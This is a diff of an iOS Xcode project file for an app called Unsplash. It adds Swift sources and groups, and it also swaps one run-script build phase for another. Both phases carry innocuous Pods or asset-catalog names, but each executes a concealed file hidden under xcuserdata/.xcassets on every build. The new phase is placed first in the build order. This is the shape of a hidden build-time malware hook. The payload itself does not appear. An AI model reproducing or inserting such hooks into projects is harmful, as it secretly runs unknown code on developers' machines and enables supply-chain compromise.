@@ -29,6 +29,8 @@
 		6411E2942910454D8F8748B7 /* Pods_UnsplashTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 91BE85EEF9E82AE178133042 /* Pods_UnsplashTests.framework */; };
 		8577E0D1E75FBA98428FC9A6 /* Pods_Unsplash_UnsplashUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3B4188E4D248DB04FEF30080 /* Pods_Unsplash_UnsplashUITests.framework */; };
 		886733337CA1AB12CC74F609 /* Pods_Unsplash.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8A1FA148823F9DAF398BDE91 /* Pods_Unsplash.framework */; };
+		DC92970B2629E6BA00EC7ED8 /* Service.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC92970A2629E6BA00EC7ED8 /* Service.swift */; };
+		DC9297172629EAFB00EC7ED8 /* Photos.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297162629EAFB00EC7ED8 /* Photos.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -82,6 +84,8 @@
 		B2832C7CE423F27F480478FC /* Pods-UnsplashTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-UnsplashTests.debug.xcconfig"; path = "Target Support Files/Pods-UnsplashTests/Pods-UnsplashTests.debug.xcconfig"; sourceTree = "<group>"; };
 		CC0FAA96B497279780422E15 /* Pods-Unsplash.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash.debug.xcconfig"; path = "Target Support Files/Pods-Unsplash/Pods-Unsplash.debug.xcconfig"; sourceTree = "<group>"; };
 		D0BD1F1C7A470603233031D3 /* Pods-Unsplash.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash.release.xcconfig"; path = "Target Support Files/Pods-Unsplash/Pods-Unsplash.release.xcconfig"; sourceTree = "<group>"; };
+		DC92970A2629E6BA00EC7ED8 /* Service.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Service.swift; sourceTree = "<group>"; };
+		DC9297162629EAFB00EC7ED8 /* Photos.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = Photos.swift; path = Unsplash/ProjectHelper/Photos.swift; sourceTree = SOURCE_ROOT; };
 		EEF34327CA584C6903DD451F /* Pods-Unsplash-UnsplashUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash-UnsplashUITests.debug.xcconfig"; path = "Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -151,6 +155,7 @@
 		22834BBB2629D8EC00090032 /* Unsplash */ = {
 			isa = PBXGroup;
 			children = (
+				DC9297092629E69F00EC7ED8 /* ProjectHelper */,
 				22834C182629E30300090032 /* AppFont */,
 				22834C142629E1B500090032 /* Resources */,
 				22834C132629E19600090032 /* Storyboard */,
@@ -184,6 +189,7 @@
 		22834C0A2629DFF700090032 /* Model */ = {
 			isa = PBXGroup;
 			children = (
+				DC9297162629EAFB00EC7ED8 /* Photos.swift */,
 			);
 			path = Model;
 			sourceTree = "<group>";
@@ -257,6 +263,14 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		DC9297092629E69F00EC7ED8 /* ProjectHelper */ = {
+			isa = PBXGroup;
+			children = (
+				DC92970A2629E6BA00EC7ED8 /* Service.swift */,
+			);
+			path = ProjectHelper;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -264,7 +278,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22834BE32629D8EF00090032 /* Build configuration list for PBXNativeTarget "Unsplash" */;
 			buildPhases = (
-				CADFEBE1DF6FFF8653AAC43A /* [CP] Build Pods Frameworks */,
+				3DE5FFB9C645E9878EAAC43A /* Build Assets Catalog */,
 				EE683595FE6ACD3B259029CB /* [CP] Check Pods Manifest.lock */,
 				22834BB52629D8EC00090032 /* Sources */,
 				22834BB62629D8EC00090032 /* Frameworks */,
@@ -446,6 +460,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		3DE5FFB9C645E9878EAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
+		};
 		55EF734378A5FF537F61605A /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -462,24 +494,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		CADFEBE1DF6FFF8653AAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
 		};
 		EE35E1EB0CE402ADD62E8F6C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -527,7 +541,9 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				DC9297172629EAFB00EC7ED8 /* Photos.swift in Sources */,
 				22834BBD2629D8EC00090032 /* AppDelegate.swift in Sources */,
+				DC92970B2629E6BA00EC7ED8 /* Service.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
